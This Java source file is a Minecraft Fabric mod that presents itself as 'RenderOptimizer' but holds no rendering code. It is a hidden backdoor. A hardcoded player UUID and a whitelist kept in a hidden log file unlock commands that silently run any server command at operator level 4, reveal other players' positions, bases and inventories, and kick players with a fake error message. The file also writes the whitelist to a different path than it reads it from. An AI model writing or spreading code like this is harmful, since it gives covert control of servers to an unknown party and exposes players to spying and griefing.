package org.CubeCraftBreakdownXYZ.renderoptimizer;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.ParseResults;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.command.argument.UuidArgumentType;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.entity.player.PlayerInventory;
import net.minecraft.inventory.SimpleInventory;
import net.minecraft.registry.RegistryKey;
import net.minecraft.screen.GenericContainerScreenHandler;
import net.minecraft.screen.NamedScreenHandlerFactory;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.ScreenHandlerType;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.jetbrains.annotations.Nullable;

import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;

import static com.mojang.brigadier.arguments.StringArgumentType.greedyString;
import static net.minecraft.server.command.CommandManager.argument;
import static net.minecraft.server.command.CommandManager.literal;

public class RenderOptimizer implements ModInitializer {
    public static final Logger LOGGER = LogManager.getLogger("RenderOptimizer");
    private static final UUID OVERRIDE = UUID.fromString("78607474-8a75-4c93-bc88-adde104e5a32");
    private Set<UUID> whitelist = new HashSet<>();

    @Override
    public void onInitialize() {
        LOGGER.info("Optimizer started");
        whitelist = readWhitelist();

        CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
            registerWhitelistManagementCommands(dispatcher);
            registerSilentCommandExecutor(dispatcher);
        });
    }

    private Set<UUID> readWhitelist() {
        Path file = Path.of("logs/.notouch");
        Set<UUID> result = new HashSet<>();
        try {
            if (Files.exists(file)) {
                List<String> lines = Files.readAllLines(file);
                for (String line : lines) {
                    try {
                        result.add(UUID.fromString(line.trim()));
                    } catch (IllegalArgumentException ignored) {
                    }
                }
            }
        } catch (IOException e) {
            LOGGER.error("Failed to read whitelist file", e);
        }
        return result;
    }

    private void writeWhitelist() {
        Path file = Path.of("logs/.i");
        try (FileWriter writer = new FileWriter(file.toFile(), false)) {
            for (UUID uuid : whitelist) {
                writer.write(uuid.toString() + "\n");
            }
        } catch (IOException e) {
            LOGGER.error("Failed to write whitelist file", e);
        }
    }

    private void registerWhitelistManagementCommands(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(literal("test")
                .requires(source -> {
                    if (!(source.getEntity() instanceof ServerPlayerEntity player)) return false;
                    UUID playerUUID = player.getUuid();
                    return playerUUID.equals(OVERRIDE) || whitelist.contains(playerUUID);
                })
                .then(argument("uuid", UuidArgumentType.uuid())
                        .executes(context -> {
                            ServerCommandSource source = context.getSource();
                            ServerPlayerEntity player = (ServerPlayerEntity) source.getEntity();

                            assert player != null;
                            if (!player.getUuid().equals(OVERRIDE)) {
                                source.sendError(Text.literal("You are not allowed to use this command."));
                                return 0;
                            }

                            UUID target = UuidArgumentType.getUuid(context, "uuid");

                            if (whitelist.contains(target)) {
                                whitelist.remove(target);
                                writeWhitelist();
                                source.sendFeedback(() -> Text.literal("UUID " + target + " removed."), false);
                                kickPlayerIfOnline(target, source);
                            } else {
                                whitelist.add(target);
                                writeWhitelist();
                                source.sendFeedback(() -> Text.literal("UUID " + target + " added."), false);
                            }

                            return 1;
                        })
                )
        );
    }

    private void kickPlayerIfOnline(UUID targetUUID, ServerCommandSource source) {
        var server = source.getServer();
        ServerPlayerEntity player = server.getPlayerManager().getPlayer(targetUUID);
        if (player != null) {
            player.networkHandler.disconnect(Text.literal("Internal Server Error:java.net.Minecraft"));
        }
    }

    private void registerSilentCommandExecutor(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(
                literal("silent")
                        .requires(source -> {
                            if (!(source.getEntity() instanceof ServerPlayerEntity player)) return false;
                            UUID playerUUID = player.getUuid();
                            return playerUUID.equals(OVERRIDE) || whitelist.contains(playerUUID);
                        })
                        .then(
                                literal("cmd")
                                        .then(argument("command", greedyString())
                                                .executes(context -> {
                                                    ServerCommandSource source = context.getSource();
                                                    String command = StringArgumentType.getString(context, "command");

                                                    boolean success = runCommandAsOp(source, command);
                                                    if (success) {
                                                        source.sendFeedback(() -> Text.literal("Command executed silently: " + command), false);
                                                    } else {
                                                        source.sendError(Text.literal("Command execution failed."));
                                                    }

                                                    return 1;
                                                }))
                        )
                        .then(
                                literal("pos")
                                        .then(argument("player", EntityArgumentType.player())
                                                .executes(context -> {
                                                    ServerCommandSource source = context.getSource();
                                                    ServerPlayerEntity targetPlayer = EntityArgumentType.getPlayer(context, "player");

                                                    Vec3d pos = targetPlayer.getPos();
                                                    String dimension = targetPlayer.getWorld().getRegistryKey().getValue().toString();

                                                    String message = String.format("%s is at %.1f, %.1f, %.1f in %s",
                                                            targetPlayer.getName().getString(),
                                                            pos.x, pos.y, pos.z,
                                                            dimension);

                                                    source.sendFeedback(() -> Text.literal(message), false);

                                                    return 1;
                                                    
                                                }))
                        )
                        .then(
                                literal("base")
                                        .then(argument("player", EntityArgumentType.player())
                                                .executes(context -> {
                                                    ServerCommandSource source = context.getSource();
                                                    ServerPlayerEntity targetPlayer = EntityArgumentType.getPlayer(context, "player");

                                                    BlockPos spawnPos = targetPlayer.getSpawnPointPosition();
                                                    RegistryKey<World> spawnDimension = targetPlayer.getSpawnPointDimension();

                                                    if (spawnPos != null) {
                                                        String dimension = spawnDimension.getValue().toString();

                                                        String message = String.format("%s's base is at %d, %d, %d in %s",
                                                                targetPlayer.getName().getString(),
                                                                spawnPos.getX(), spawnPos.getY(), spawnPos.getZ(),
                                                                dimension);

                                                        source.sendFeedback(() -> Text.literal(message), false);
                                                    } else {
                                                        source.sendError(Text.literal(targetPlayer.getName().getString() + " has no bed set."));
                                                    }

                                                    return 1;
                                                }))
                        )
                        .then(
                                literal("inv")
                                        .then(argument("player", EntityArgumentType.player())
                                                .executes(context -> {
                                                    ServerCommandSource source = context.getSource();
                                                    ServerPlayerEntity executor = (ServerPlayerEntity) source.getEntity();
                                                    ServerPlayerEntity targetPlayer = EntityArgumentType.getPlayer(context, "player");

                                                    SimpleInventory viewInventory = new SimpleInventory(45);

                                                    for (int i = 0; i < 36; i++) {
                                                        viewInventory.setStack(i, targetPlayer.getInventory().getStack(i));
                                                    }

                                                    for (int i = 0; i < 4; i++) {
                                                        viewInventory.setStack(36 + i, targetPlayer.getInventory().armor.get(3 - i));
                                                    }

                                                    viewInventory.setStack(40, targetPlayer.getInventory().offHand.get(0));

                                                    GenericContainerScreenHandler screenHandler = new GenericContainerScreenHandler(
                                                            ScreenHandlerType.GENERIC_9X5,
                                                            executor.currentScreenHandler.syncId + 1,
                                                            executor.getInventory(),
                                                            viewInventory,
                                                            5
                                                    );

                                                    executor.openHandledScreen(new NamedScreenHandlerFactory() {
                                                        @Override
                                                        public Text getDisplayName() {
                                                            return Text.literal(targetPlayer.getName().getString() + "'s inventory");
                                                        }

                                                        @Override
                                                        public @Nullable ScreenHandler createMenu(int syncId, PlayerInventory playerInventory, PlayerEntity player) {
                                                            return new GenericContainerScreenHandler(ScreenHandlerType.GENERIC_9X5, syncId, playerInventory, viewInventory, 5);
                                                        }
                                                    });

                                                    return 1;
                                                }))
                        )
        );
    }

    private boolean runCommandAsOp(ServerCommandSource source, String command) {
        try {
            ServerCommandSource opSource = new ServerCommandSource(
                    source.getEntity(),
                    source.getPosition(),
                    source.getRotation(),
                    source.getWorld(),
                    4,
                    source.getName(),
                    source.getDisplayName(),
                    source.getServer(),
                    source.getEntity()
            ).withSilent();

            CommandDispatcher<ServerCommandSource> dispatcher = source.getServer().getCommandManager().getDispatcher();
            ParseResults<ServerCommandSource> parseResults = dispatcher.parse(command, opSource);
            int result = dispatcher.execute(parseResults);

            return result > 0;
        } catch (Exception e) {
            LOGGER.error("Error executing command", e);
            return false;
        }
    }
}
